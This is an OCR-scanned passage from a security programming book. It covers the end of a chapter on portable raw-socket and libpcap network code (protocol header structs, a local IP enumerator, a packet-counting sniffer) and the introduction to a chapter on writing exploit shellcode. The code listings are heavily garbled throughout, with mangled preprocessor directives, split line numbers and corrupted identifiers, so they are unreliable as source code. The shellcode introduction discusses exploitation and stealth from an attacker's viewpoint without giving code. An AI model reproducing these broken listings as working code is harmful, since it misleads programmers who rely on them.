sysfsocket, h 
sys/ioctl.h 
n/a 
sys/socket.h 
sys/socket.h 
unistd.h 
n/a 
netinet/in.h 
netinet/in. h 
netinet/in.h 
netinet/in.h 
sys/ioctl. h 
netinet/in.h 
n/a 
Win32 Header File 
winsock2. h 
winsock2. h 
n/a for sockets 
winsock2.h 
winsock2.h 
winsock2. h 
n/a for sockets 
winsock2.h 
winsock2. h 
winsock2. h 
winsock2.h 
winsock2.h 
winsock2. h 
ws2tcpip.h 
mstcpip. h 
In addition to common functions and constants, raw sockets programming usually 
involves constructing protocol headers and payloads.The most common protocol header 
data structures used are the IPv4, ICMP, UDP, and TCP headers. On the UNIX plat-
form, these data structures typically are defined in the ip.h, kmp.ii, tldp.h, and tcp.lt header 
files located in the hun'include/netinet/ directory in the filesystem, On the Windows plat-
form. these data structures are not provided and must be manually defined by the pro-
grammer. Often, the UNIX header files can be ported to the Windows platform with 
some minor modifications. 
The following header flies may be used on either the UNIX or Windows platforms 
for constructing IPv4, UDP, and TCP protocol headers. 
IP(v4) Header File: 
/* 
* ip.h 
* 
* cross-platform compatible IPv4 
* header. 
*/ 
ttifndef 
IP_H 
#define 
IP_H 

314 
Chapter 7 • Portable Network Programming 
#ifdef WIN3 2 
itinclude <:windOwS*h> 
ttifndef 
LITTLE_ENDIAN 
^define LITTLE_ENDIAN 
1234 
#emdif 
#ifndef BIG_ENDIAN 
#define BIG_ENDIAN 
4321 
#endif 
ttifndef 
BYTEmGRDER 
// if intzel x36 or alpha proc, 
l i t t l e endian 
#if defined(_M_IX36) 
|| 
defined(_M_ALPHA) 
itdefine BYTE_QRDER LITTLE_ENDIAN 
#endif 
// if power pc or MIPS RXOOO, big endian.. 
#if defined(_M_PPC) | | defined(_M_MX000) 
Jtdefine BYTE_ORDER BIG_ENDIAN 
#endif 
#endif 
ttelse 
/* include byte ordering constants */ 
#include <sys/typesTh> 
#endif 
/* 
* WIN32H define IPv4 header, assume 
* little endian byte ordering 
*/ 
struct ip 
{ 
it if EYTE_ORDER == LITTLE_ENDIAN 
unsigned char 
ip_hl:4, /* header length */ 
ip_v:4; 
/* version 
/* BIG_ENDIAN V 
#else 
#endif 
unsigned char 
ip_v:4 , /* version 
*/ 
ip_hl:4; 
/* header length */ 
unsigned char 
ip_tos; 
/* type of service */ 
short 
ip_len; 
/* total length 
*/ 
unsigned short 
ip_id ; 
/* id 
V 
short 
ip_off; 
/* fragment offset */ 
unsigned char 
ip_ttl; 
/* time to live 
*/ 
unsigned char 
ip_p 
; 
/* proto 
*/ 
unsigned short 
ip_sum; 
/* checksum 
*/ 
struct in_addr 
ip_src; 
/* source address 
*/ 
struct in_addr 
ip_dst; 
/* dest 
address 
*/ 

Portable Network Programming • Chapter 7 
315 
t e n d i f /* 
IP H 
*/ 
"as ICMP Header File: 
/* 
* icrop.h 
ttifndef 
_ICMP_H 
#define _ICMP_H 
» 
define 
ICMP_ECHO_REPLY 
0x00 
#define 
ICMP_ECHO_REQUEST0x08 
s t r u c t 
icmp 
{ 
unsigned char 
icmp_type ; 
/* type of message, 
see below 
*/ 
unsigned char 
icmp_code ; 
/* type sub code 
*/ 
unsigned s h o r t 
icmp_cksum; 
/* checksum 
*/ 
union 
{ 
} 
icmp_hun 
s t r u c t 
ih_idseq; 
{ 
unsigned 
unsigned 
} 
i h _ i d s e q ; 
; 
s h o r t 
s h o r t 
i c d _ i d ; 
icd_seq; 
tt define 
icrnp_id 
icmp_hunr i h _ i d s e q T i c d _ i d 
ttdefine icmp_seq 
icmp_hun. i h _ i d s e q . i c d _ s e q 
#endif /* 
ICMP_H 
V 
I* f x i n E s i UDP Header File: 
/* 
* Udp. h 
* 
c r o s s - p l a t f o r m 
* UDP 
V 
tfifndef 
#define 
h e a d e r . 
UDE_H 
U D P _ H _ 
comaptible 
struct udphdr 

316 
Chapter 7 * Portable Network Programming 
S t N \ S £ 
( 
}; 
unsigned 
unsigned 
short 
unsigned 
short uh_sport ? 
short uh_dportj 
uh_ulen ; 
short uh_sum ; 
f* source port 
/* dest 
port 
f* dgram 
length 
?* checksum 
*/ 
*l 
+ 1 
'/ 
(lendif /* 
g TCP Header File (tcp.h): 
* tcp.h 
* cross-platform compatible TCP 
* header. 
*/ 
flifndef TCP_H_ 
((define 
TCP_H_ 
#i£de£ WIN32 
((include ^windows-h> 
Jtifndef 
LITTLE_ENDIAN 
((define LITTLE_ENDIAN 
1234 
#endif 
(tifndef 
BIG_EJTOIAN 
fldefine BIG_ENDIAN 
4321 
#endif 
(tifndef BYTE_ORDER 
// if intel xS6 or alpha proc, little endian 
#if defined(_M_IX8S) || defined(_M_ALPHA) 
((define BYTE_ORDER LITTLE_ENDIAN 
(tendif 
// if power pc or MIPS RX0O0, big endian.. 
#i£ defined(_M_PPC) || defined (_M_MX0 00) 
idefine BYTE„ORDER BIG_ENDIAN 
#endi£ 
tendif 
((else 
f* include byte ordering constants */ 
#include <sys/types-h> 
#endif 
r 

Portable Network Programming • Chapter 7 
317 
* TCP 
*/ 
struct 
{ 
header 
tcphdr 
unsigned 
unsigned 
unsigned 
unsigned 
#if BYTE_ORDER — 
ielse 
ttendif 
unsigned 
short 
short 
int 
Lnt 
th_sport, 
th_dpoj '.. 
th_seq 
th_ack 
LITTLE_ENDIAN 
char 
/* BIG_ENDIAN ' 
unsigned 
unsigned 
unsigned 
unsigned 
unsigned 
char 
char 
short 
short 
short 
th_x2:4 
V 
th_off:4 
th_ 
th_flags ; 
th_win 
th_sum 
th_urp 
• 
/ * 
• 
/
* 
; /* 
; /* 
th_' 
. /* 
X2:4 
/* 
; /* 
; /* 
; /* 
source port */ 
dest 
port */ 
seq number * / 
ack number * / 
unused 
*/ 
aff:4; /* data offset */ 
data offset */ 
; 
/* unused 
TCP flags 
*/ 
window 
*/ 
checksum 
*/ 
urg pointer */ 
tfendif 
/* 
Local IP Address Determination 
When constructing protocol headers to be sent via raw sockets, it is often necessary to 
obtain the local IPv4 address that the IPv4 datagram will originate from. This is a 
requirement for sending custom IPv4 traffic over a raw IPv4 socket, for completing the 
TCP and UDP protocol pseudo-headers required for computing TCP and UDP 
checksum values, and in sonic cases for receiving traffic via raw sockets. 
Local IP addresses can be obtained in a few ways. One approach is to obtain the 
local address value from user input. Another approach is to obtain a list of all IP 
addresses on the system and select one address from the list. 
User Supplied 
Small, homegrown network diagnostic and security tools commonly require that the 
source IP address to be used for constructing network traffic be supplied as a command-
line option.This approach is useful, because it is simple to implement and widely 
portable.This approach is obviously limited in that the user must supply the IP address 
to the program every time that it is run. 
There are no portability issues associated with this technique.The standard 
inet_addr() function is used to convert the command line-supplied IP address into an 
unsigned integer.This value is then used as necessary. No platform-dependent function 
calls are necessary. 

318 
Chapter 7 • Portable Network Programming 
Listing Interfaces 
In some cases, it is necessary to obtain a list of local IF addresses available on the system. 
This can be useful for presenting a user with a list of local IF addresses to use for 
sending or receiving network traffic or for automatically selecting an address to use. 
The programming interface used to enumerate local IF addresses is not highly 
portable. On UNIX platforms, the ioctl function is typically used to enumerate network 
interfaces and associated IF addresses. On the Windows platform, the WSAIocti function 
is used. On USD UNIX platforms, the getifaddrs function can also be used to enumerate 
local IF addresses.The best approach for dealing with this is to use ifdcj prc-compiler 
directives to use the correct functions for the platform that the code is compiled on. 
Example 7.17 demonstrates the use of ifdef pre-compiler directives to conditionally 
use either the ioctl or WS A Ioctl functions to obtain and list the local IP addresses avail-
able on a system. 
l ) « '21 Example 7.17 Local IP Address Lo 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
* lookupl.c 
* 
• 
V 
Sifdef WIN32 
frpragma. comment (lib H
 pws2_32,lib*} 
#include 
Seise 
^include 
ftinclude 
#include 
^include 
H i !••'. u d e 
^include 
ftendif 
^include 
/* 
<winsock2. h> 
<sys/types. h> 
<netinet/in.h> 
<. sys / socket. h> 
<sys/ioctl.h> 
<arpa/inet.h> 
<net/if.h> 
<;stdio.h> 
* lookup_addr_at_idx{) 
+ 
-
V 
ttdefine BUF_SIZE 
4096 
i n t 
( 
1ookup_addr_a t _ i dx 
ttifdef WIN32 
(int 
idx 
, 
unsigned int *addr 

Portable Network Programming • Chapter 7 
319 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
LPSOCKET_ADDRES5_LIST list 
SOCKET 
Sd 
char 
int 
int 
Int 
= NULL; 
= 0; 
buf[BUF_SIZE]; 
len 
= 0; 
ret 
= 0; 
X 
= 0; 
Sd 
= socket(AF_INET, SOCK_RAW, IPPROTO_IP); 
if(3d == INVALID_SOCKET) 
( 
return (-1); 
) 
ret = WSAIoctl(sd 
S10_ADDRES S_LIST_QUERY, 
NULL, 
0 
buf , 
BUF_SIZE, 
(unsigned long *} &lenr 
NULL, 
NULL); 
closesocket(sd); 
iflret != 0 | | 
len <= 0) 
return(-1); 
ist = [LPSOCKET_ADDRESS_LIST) buf; 
f(list->iAddressCount <= 0) 
return(-1); 
or(x=0; x <= idx S£ x < list->iAddressCount; ++x) 
idx) 
if (x 
{ 
/* found address @ index */ 
memcpy(addr, 
&list->Address(x],lpSockaddr->sa_data(2], 4); 
return(1); 
/* no more addresses V 
return(O); 
#else 
struct ifconf 
ifc; 
struct ifreq *ifr = NULL; 
char 
buf[BUF_SIZE]; 

Chapter 7 • Portable Network Programming 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
141 
142 
143 
144 
145 
146 
147 
148 
149 
150 
151 
ir.t 
ir.t 
ir.t 
ir.c 
ir.t 
ret = 0; 
off - 0 
cnt = 0 
cdx = 0 
sd - 0 
sd 
= socket(AF_INET, SOCK_DGRAM, 0) ; 
iflsd < 0) 
{ 
return(-l) ; 
} 
ifc.ifc_len = BUF_SIZE; 
ifc.ifc_buf = buf; 
ret 
= ioctllsd, SIOCGIFCONF, tifc); 
iflret < 0) 
{ 
return(-l); 
> 
ifr • ifc. ifc_req; 
while(cnt < ifc.ifc_len && cdx <= idx) 
{ 
if(ifr->ifr_addr.5a_family == AF_INET) 
{ 
if (cdK — icbt) 
{ 
memcpy (addr, 
&ifr->ifr_addr.sa_data[2], 4); 
return(l); 
} 
++cdx; 
off 
= IFMAMSIZ + ifr->ifr_addr.sa_len; 
Cnt 
+= Off; 
((char *) ifr) += off; 
} 
close (sd); 
#endif 
return(0); 
} 
int 
main(void) 
( 
ftifdef WIN32 
WSADATA wsa; 
ffendif 
struct in addr ia; 

Portable Network Programming • Chapter 7 
321 
152 
unsigned int 
addr • 0; 
1 53 
int 
ret 
= 0; 
1 54 
int 
idx 
= 0; 
155 
1 56 #ifdef WIN32 
157 
158 
1 59 
if(WSAStartup(MAKEWORD(2, 0) , Swsal != 0x0) 
160 
{ 
1 61 
printf("WSAStartupl) failed.\n"); 
162 
return(l) ; 
163 
} 
164 #endif 
165 
166 
while(l) 
167 
( 
168 
ret 
= lookup_addr_at_idx(idx, saddr} ; 
169 
if(ret < 0) 
170 
{ 
171 
printf {"lookup_addr_at_idx () 
failed. \n") j 
1 72 
return*1) ; 
173 
} 
174 
else i f t r e t == 0) 
175 
{ 
176 
/* no more addresses V 
177 
break; 
178 
} 
179 
180 
iaTs_addr = addr; 
181 
printf("address %d; %s\n", idx, inet_ntoa{ia)}j 
182 
183 
++idx; 
184 
) 
185 
186 
printf("end of address list.\n%d listed. \n", 
idxl; 
187 
188 
return(O) ; 
189 } 
Example Execution 
Here are examples of Windows and UNIX output. 
Windows Output 
C:\>lookupl.exe 
address 0: 192.168.10.1 
address 1: 192.168.204.1 
end of address list. 
2 listed. 
UNIX Output 
obsd32# gcc -o lookupl lookupl.c 
obsd32# ./lookupl 
address 0: 127.0.0.1 

322 
Chapter 7 • Portable Network Programming 
address 1: 10.0.a.70 
end of address list. 
2 listed. 
Analysis 
• 
At lines 39 through 88, a Win-32-specific method for enumerating IP 
addresses is performed if the program is compiled on the Win32 platform. 
• 
At lines 92 through 137, a UNIX-specific method for enumerating IP 
addresses is performed if the program is compiled on a non-Win32 platform. 
• 
At lines 166 through 184, a while loop calls the lookup_addr_at_idx() function 
once for each local IP address. The lookup_addr_at_idx() function takes two 
arguments: an integer variable that specifies the index of the IP address to 
return, and a pointer to an unsigned integer in which the IP address is stored. 
If the index value passed to the lookup_addr_at_idxQ function exceeds the 
number of IP addresses on the local system, meaning that all IP addresses have 
been enumerated, the function returns a value of 0, If an error occurs during 
enumeration, the function returns negative -'/. Note that the 
lookup_ciddr_at_idxQ function will use either the Win32-specific method at line 
37 or the non-Win32-specific method at line 92, depending on which plat-
form the program is compiled on. This portion of the program lists each IP 
address on the local system as shown in the example output. 
• 
At lines 39 through 44, variable initialization for the Win32-specific method is 
performed.The LPSOCKET_ADDR_LIST variable will be used to store the 
list of IP addresses available on the local system. 
• 
At line 101, a socket descriptor is allocated.This socket descriptor is required 
by the WSAIoctlQ function. 
• 
At lines 52 through 60, the WSA Ioctt()_ function is called with the 
SIO_ADDRESS_LIST_QUERYoption.Thh 
operation 
requests 
that 
the 
LPSOCKET_ADDR_LIST variable be populated with a hst of all IP addresses 
on the local system. 
• 
At lines 70 through 74, the IP address list returned from the WSAIoctlQ func-
tion is checked to ensure that at least one IP address is returned. 
• 
At lines 76 through 85, each IP address in the list returned from the WSAIoctlQ 
function is iterated in a loop. When the index of the IP address in the list 
matches in the index passed to the function, that IP address is copied into the 
address variable passed to the function.The function then returns. 
• 
At lines 92 through 99, variable initialization for the UNIX-specific method is 
performed. The variable ifc of type struct ifconfwiW be used to store the list of IP 
addresses available on the local system. 

Portable Network Programming • Chapter 7 
323 
• 
At lines 1 1 0 through 114, the kxtlQ function is called with the SIOCGIF-
CONF value to populate the list. 
• 
At lines 116 through 135, each IP address in the list returned from the ioctlQ 
function is iterated in a loop in a manner similar to the Win32-specific 
method. When the index of the IP address in the list matches the index passed 
to the function, that IP address is copied into the address variable and passed to 
the function after which the function returns. 
Pcap and WinPcap 
The standard for raw-packet capture on die UNIX platform is the libpcap packet capture 
library. This library is frequently used in network security tools for a variety of purposes 
including in network scanners and network monitoring software. 
While many UNIX platforms ship with libpcap by default, the Windows platform 
does not. Fortunately, the freely available WinPcap packet driver and programming 
library can be used to implement pcap-\\k.e functionality on the Windows platform. 
WinPcap is mostly compatible with libpcap. The only major difference from a porta-
bility perspective is in how network interface names are handled. On most UNIX plat-
forms, network interfaces are named with a simple three- or four-character value such as 
ethO or .\7/.The libpcap library expects this type of network interface name on the 
UNIX platform. For example, we can list available network interfaces using the ifconfig 
command, and then use the interface name in our libpcap program like so: 
obsd32tt if coring -a 
xll 
E interface name 
We then use the interface name in a call to the pcap_open_live function like so: 
pcap_open_live( "xll", ...) ; 
The Windows platform does not list network interface names in the same way 
Network interface names have a special format, are stored in UNICODE format, and 
must be retrieved using special APIs.The names are not simple American Standard Code 
for Information Interchange (ASCII) strings and cannot be entered in by the user of a 
program. 
To overcome this difference, programs that use the WinPcap library typically enu-
merate the list of network interfaces on the local system and present them in a list to the 
user for selection. This is the behavior of some popular tools such as Ethereal and 
WinDump. 
This difference can be illustrated by running the tepditmp program on a UNIX 
system and then running the WinDump utility on the Windows platform. On the UNIX 
platform, the interface name is supplied and the program executes. On the Windows 
platform, a list of interfaces must first be displayed. The user then selects the numerical 
index of the interface and supplies it to WinDump, 

324 
Chapter 7 • Portable Network Programming 
UNIX Output 
obsd32# tcpdump -i ethO 
windows output: 
C:\>windump -D 
l.\Device\NPF_(80D2B901-F0B6-44A4-BC4O-DlB13ESF81FC} 
(UNKNOWN 3Com EtherLink PCI) 
C;\>windump -i 1 
The querying of network interfaces and presentation of this data to the user is a 
complicated process. Fortunately, the WinDump program is open source and contains 
source code to perform these operations.The W32_fzs.h header file included with the 
WinDump program source code contains two functions: PrintDcviccLisi and 
GetAdapterFroitiList, which can be used to display a list of available adapters and obtain 
the adapter name in the same manner as the Win Dump program. 
The following example program demonstrates the use of the libpcap and WinPcap 
programming libraries to sniff all network traffic on the local network and print out the 
number of received packets.The program uses iytfe/pre-compiler directives to condition-
ally include resources required for either the UNIX or Win32 platforms. 
Example 7.18 demonstrates simple usage of the libpcap library on the UNIX plat-
form to sniff all network traffic and print out the number of packets received. 
^ ^ 
Example 7.18 
PCAP (pcapl.c) 
2 
* pcapl.c 
3 * 
4 
* cross-platform compatible example 
5 
* of libpcap/WinPcap. 
6 
v 
7 
8 
ttifdef WIN32 
9 
10 ttpragma comment{lib, "wpcap.lib") 
/* required for WinPcap */ 
11 
12 
ttinclude 
<windows.h> 
13 
^include <pcapTh> 
14 
15 ttinclude "getopt.h" 
16 
ttinclude 
MW32_fzs.fcr 
/* required for FrintCeviceist() 
17 
& GetAdapterFromListf) */ 
18 
ttelse 
19 
20 
ttinclude 
<pcap-h> 
21 ttinclude <stdlib.h> 
22 
23 
iendif 
24 
25 tt include <stdio.hi-
26 
27 
/* options for getopt() */ 

Portable Network Programming • Chapter 7 
325 
28 #ifdef WIN32 
29 ((define OPTIONS 
"i:D" 
30 ((else 
31 ((define OPTIONS 
"i:" 
32 #endif 
33 
34 /* if WIN32, add support for listing & 
35 
selecting adapter */ 
36 Sifdef WIN32 
37 
38 f* 
39 
* get_adap() 
40 * 
41 * 
42 */ 
43 
char *get_adap 
{int 
idx 
) 
44 
i 
45 
char *device = NULL; 
46 
Char 
ebUf(PCftP_ERREUF_SIZE]; 
47 
48 
device 
• pcap_lookupdev(ebuf}; 
49 
iffdevice == NULL) 
50 
{ 
51 
return(NULL); 
52 
} 
53 
54 
device = GetAdapterFromList(device, idx)j 
55 
55 
return(device); 
57 > 
58 
59 /* 
60 
* list_adaps() 
61 
* 
62 
* 
63 
v 
64 
void list_adaps 
{) 
65 
( 
66 
char *device = NULL; 
67 
char ebuf[PCAP_ERREUF_SIZE]; 
68 
69 
/* 
70 
71 
* from winpcap source 
72 
73 
v 
74 
device 
= pcap_lookupdev(ebuf); 
75 
ifidevice == NULLI 
76 
{ 
77 
printf("pcap_lookupdev() 
failed: %s\n"H ebufJ; 
78 
r e t u r n ; 
79 
} 
80 
81 
PrintDeviceList(device); 
82 } 
83 
84 
(tendif /* WIN32 */ 

Chapter 7 • Portable Network Programming 
86 
87 : 
88 
89 
90 
91 
92 
93 
94 
95 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
141 
inr. 
Tiain(int 
arg 
t 
struct 
pcap_t ' 
char 
char 
char 
char 
Lnt 
itifdef WIN32 
Lnt 
#end i f 
opterr • 
whilet (t 
{ 
ttifdef WIN32 
ftelse 
tendif 
tifdef Win32 
iendif 
) 
if(ifn = 
{ 
} 
c, 
c h a r *argv[]) 
p c ap_pk t hd r pk thdr; 
>p& 
= NULL; 
e r r ( P C A P _ E R R B U F _ S I Z E ] ; 
k i f n 
= 
NULL; 
k p k t 
= NULL; 
ch 
= 0 ; 
cnt = 0; 
idx = 0 ; 
/* required for interface index 
• 
0 ; 
:h = getoptlargc, argv, OPTIONS)) != -1> 
switch(ch) 
{ 
case ' i ' : 
/* if WIN32, get interface index V 
idx 
= atoi(optarg); 
ifn 
= get_adap(idx); 
i f d f n == NULL) 
{ 
printf("get_adap() 
failed. \r\n") 
return(1); 
) 
f* if UNIX, take interface ASCII name */ 
ifn 
= optarg; 
break; 
/* if WIN32, l i s t adapters - not used 
if compiled on UNIX p l a t f o r m V 
case 'D1: 
list_adaps(); 
return(O); 
default : 
printf("unknown cl arg.\n"J; 
return(1); 
J 
— NULL) 
printf("no interface name supplied.\n"); 
return(l); 

Portable Network Programming • Chapter 7 
327 
142 
143 
/* if WIN32 , print interface index *i 
144 iifdef WIN32 
1 45 
printf ("using interface %d\n", idxj ; 
146 
/* otherwise, printf interface name */ 
147 #else 
148 
printf("using interface %s\n", 
ifnj; 
149 #endif 
150 
151 
/* open pcap descriptor */ 
1 52 
pd = pcap_open_live(ifn, 40, 11 25, errJ; 
153 
154 
while(l) 
155 
{ 
1 56 
/* receive next packet */ 
1 57 
pkt 
= (char *) pcap_next(pd, kpkthdr}; 
1 58 
i£(pkt i= NULL) 
159 
{ 
160 
++cnt; 
161 
printf{"packets recieved; %d 
\ r " , cnt) \ 
162 
) 
163 
) 
164 
165 
return(O) ; 
1 6 6 } 
Example Execution 
Here are examples of Windows and UNIX Output. 
Windows Output 
C:\DocLLments and Settings \Mike\ 
My Documents\Visual Studio FrojectsVpcaplVDebug^poapl.exe 
no interface name supplied. 
C; \Docuinent5 and Settings \Mike\ 
My Documents\visual Studio Projects\pcapl\Debug>pcapl exe -D 
l,\Device\NPF_{S0D2B901-F0e6-44A4-8C40-DlBl3E6F8lFC) 
(UNKNOWN 3Com EtherLink PCI) 
C:\Document5 and Settings\Mike\ 
My Documents\Visual Studio FrojectsXpcaplVDebug>pcaplrexe -i 1 
using interface 1 
packets received: 
it 
UNIX Output 
obsd32# gcc -o pcapl pcapl.c -lpcap 
obsd32# ./pcapl -i xll 
using interface xll 
packets received: 13 

328 
Chapter 7 • Portable Network Programming 
Analysis 
• 
At lines 8 through 17, Win32-specific header files are included.The W32_j~zs.li 
header file is borrowed from the IVinPcap source code and is used to properly 
parse the interface names before displaying them on the Win32 platform. 
• 
At line 43, the gct_adap() function is defined.This function takes a single 
integer argument that is the index to the list of network interfaces available on 
the local system. The value returned is name of the network interface at the 
supplied index or NULL of the index is not valid, 
• 
At line 64, the ltst_adaps0 function is defined.This function takes no arguments 
and is used only to print a readable list of the network interfaces available on 
the local system. This function will typically be called to display a list of net-
work interfaces and their corresponding index values. A user can then select 
the index of the network interface to use and pass this value to the gt't_adap() 
function. 
• 
At lines 100 through 135, command-line arguments are processed using the 
UNIX-familiar getoptQ function, if-dtfpre-compiler directives are used to con-
ditionally compile Win32- or UNIX-specific implementations of the com-
mand-line options (e.g., the —i option results in a call to get_adapQ on the 
Win32 platform while simply storing the interface name provided on the 
UNIX platform). Note that an integer index must be supplied to the program 
on the Win32 platform while a string interface name must be supplied to the 
program on the UNIX platform. 
• 
At line 152, the pcap_opcn_live() function is called to allocate a pcap descriptor 
to be used for packet capture. 
• 
At line 154 through 163, the pcap_ncxt() function is called in an infinite loop. 
This function returns each new packet that is received by the pcap library. 
When a packet is returned, the counter variable ait is incremented and the 
new packet count is printed to Stdout. 
The Win Pcap packet capture driver and programming library and the WinDump 
program and source code can be obtained from the WinPcap homepage at Itttp:// 
winpcap.poUo.it. 

Portable Network Programming * Chapter 7 
329 
Summary 
Writing portable code is much easier and more straightforward in some cases than in 
others. Merely using ifdef statements accomplishes the job when the only method for 
creating cross-platform code is writing it in two different methods. However, writing 
libraries and classes that can intelligently reuse such code would be the end goal for 
these applications.The libraries can be added to any project and, whether through a 
function call or the execution of a particular method, the code can be centrally stored 
and managed. 
The most complex function oflocally executed programs is the difficulty of 
memory management and memory searching. As noted in this chapter, writing flexible 
raw socket code will be the most difficult endeavor that you will come across with 
respect to network programming. All operating systems and network hardware vendors 
are different in how they communicate over the physical data lines. These differences in 
combination with compiler differences are what lay the framework for creating cross-
platform code. 
Solutions Fast Track 
BSD Sockets and Winsock 
0 
BSD Sockets and Winsock arc similar in functionality and design; however, the 
implementation of these networks' APIs arc drastically different. 
Portable Components 
0 
Portable network code components allow developers to reuse segments of 
networking code to transmit data from programs in both UNIX, Linux, and 
Windows environments. 
www.syngress.com 

330 
Chapter 7 • Portable Network Programming 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQs at ITFAQnet.com. 
Q: Is there any advantage in using com pile-time links defined through Visual 
Studio's GUI versus an inline Pragma comment? 
A: No, there actually may be a disadvantage to relying on Microsoft's GUI if you 
plan to distribute the source code. Using Pragma comments within your code 
for linking to libraries is logical and efficient, since no other files are required 
except for the source. However, if you are dependant on Visual Studio s 
workspace, you must also distribute Microsoft's workspace and project files along 
with the source code. 
Q: Can I use the examples dbroughout this chapter in my own code projects? 
Al Absolutely. You can use any or all of the code presented throughout this book, 
provided that you state the code came from the book along with the authors' 
names. 
A 
Q: What is the best way to ensure that the code works on all the platforms I am 
developing for without having an extremely large test lab? 
A: In the commercial world, keeping costs down is always an important goal. Virtual 
operating systems (VMs) have become the industry norm in terms of software 
test and development centers. These VMs can be installed and configured such 
that you can have Linux running from within a Microsoft server, thereby allevi-
ating the need for a hardware and software solution. Our recommendation is to 
invest in a virtual lab; you will save money on hardware without jeopardizing 
software quality. 
Q: Are there any noticeable differences between 64-bit operating systems in com-
parison to 32-bit in terms of creating portable code? 
www.syngress.com 

Portable Network Programming * Chapter 7 
331 
Al Absolutely, at a minimum, in most (98%) of the cases you will be required to 
recompile the source of the program on the desired platform. Depending on the 
platform, you may also come across other undesirable ramifications such as poor 
device driver implementation support, library modifications, and memory man-
agement issues. The following example illustrates some of the changes that will 
be noticed by merely compiling it on a different platform. 
I #include <5td"io.h> 
2 
int main(int argc, char *argv[]) 
3 { 
4 
(void) printf("My Test Char is \t\t%lu bytes\n"H sizeof (char)); 
5 
(void) printf (pMy Test Short is \t%lu bytesVn*1 j sizeof (short) ) ; 
6 
(void) printf{"My Test Int is \t\t%lu bytesVn", sizeof (int)}? 
7 
(void) printf("My Test Long is \t\t%lu bytes\n"„ sizeof (long)); 
o 
(void) printf('My Test Long Long is \t\t%lu bytes\n", sizeof (long long)); 
9 
(void) printf(*My Test Pointer is \t%lu bytes\n", sizeof (void *)}; 
10 
(void) printf("Test Completed!\n"); 
1 1 
return (0); 
12 } 
Analysis 
0 Lines 4 through 9 print out a simple statement to stdout containing a variable 
and the platform's definition or size associated with that variable.The sizeof 
function used at the end of each of the lines returns the number of bytes for 
each instance. 
0 
Line 10 lets you know the program has completed. 
Execution 
The following two examples are of the same program, yet compiled and executed on 
different platforms.The first is a 32-bit platform and the second is 64-bit. 
Example 7.19 Compiled and Executed on a 32-bit Operating System 
Gabriel_root$\ cc -o -o test32 test32.c 
Ga.br iel_root$\ test32 
My Test Char is 
1 bytes 
My Test Short is 
2 bytes 
My Test Int is 
4 bytes 
My Test Long is 
4 bytes 
My Test Long Long is 
8 bytes 
My Test Pointer is 
4 bytes 
Test Completed I 
* - * 
* 

332 
Chapter 7 • Portable Network Programming 
Example 7.20 Compiled and Executed on a 64-bit Operating System 
G^briel_rQot$\ CC -xsr 
Gabriel_root$\ test64 
My Test Char is 
My Test Short is 
My Test Int is 
My Test Long is 
My Test Long Long 
My Test Pointer is 
Test Completed! 
is 
Cfr 
=v9 -0 -o 
1 bytes 
2 bytes 
4 bytes 
8 bytes 
8 bytes 
6 bytes 
test£4 test64,c 
www.syngress.com 

Chapter 8 
Writing Shellcode I 
Solutions in this Chapter: 
• 
Overview of Shellcode 
• 
The Addressing Problem 
• 
The NULL Byte Problem 
• 
Implementing System Calls 
• 
Remote Shellcode 
• 
Local Shellcode 
• 
Windows Shellcode 
Related Chapters: Chapter 9 
IZI Summary 
IZI Solutions Fast Track 
IZI Frequently Asked Questions 
333 
«
! 

334 
Chapter 8 * Writing Shellcode I 
Introduction 
Writing shellcode involves an in-depth understanding of assembly language for the 
target architecture in question. Usually, different shellcode is required for each version of 
each operating system under each hardware architecture.This is why pubhc exploits tend 
to exploit a vulnerability' on a highly specific target system and why a long list of target 
version/OS/hardware (albeit usually very incomplete) is included in the exploit. Within 
shellcode, system calls are used to perform actions.Therefore, most shellcode is operating 
system-dependent because most operating systems use different system calls. Reusing the 
code of the program in which the shellcode is injected is possible but difficult, and not 
often seen. As you saw in the previous chapter, it is always recommended to first write 
the shellcode in C using system calls only, and then to write it in assembly. This forces 
you to think about the system calls used and facilitates how to translate the C program. 
After an overview of the assembly programming language, this chapter looks at two 
common problems that shellcode must overcome: the addressing problem and the 
NULL byte problem. It concludes with some examples on writing both remote and 
local shellcode for the 32-bit Intel Architecture (1A32) platform (also referred to as x86). 
Overview of Shellcode 
Shellcode is the code executed when a vulnerability has been exploited. Shellcode is usu-
ally restricted by size constraints, such as the size of a buffer sent to a vulnerable applica-
tion, and is written to perform a highly specific task as efficiently as possible. Depending 
on the goal of the attacker, efficiency (such as the minimum number of bytes sent to the 
target application) may be traded off for the versatility of having a system call proxy, the 
added obfuscation of having polymorphic shellcode, the added security of establishing an 
encrypted tunnel, or a combination of these or other properties. 
From the hacker's point of view, having accurate and reliable shellcode is a require-
ment in performing real-world exploitation of a vulnerability. If the shellcode isn't reli-
able, the remote application or host could potentially crash. An administrator almost 
certainly will wonder why a full system crash occurred and will attempt to track down 
the problem; this is certainly not ideal for anonymous or stealth testing of a vulnerability 
Furthermore, the unreliable shellcode or exploit could corrupt the memory of the appli-
cation in such a way that the application is still running but must be restarted in order 
for the attacker to exploit the vulnerability. In production environments, this restart 
could take place months later during a scheduled downtime or during an application 
upgrade. The upgrade, however, could fix the vulnerability and thus remove the 
attacker's access to the organization. 
From a security point of view, accurate and reliable shellcode is just as critical. In 
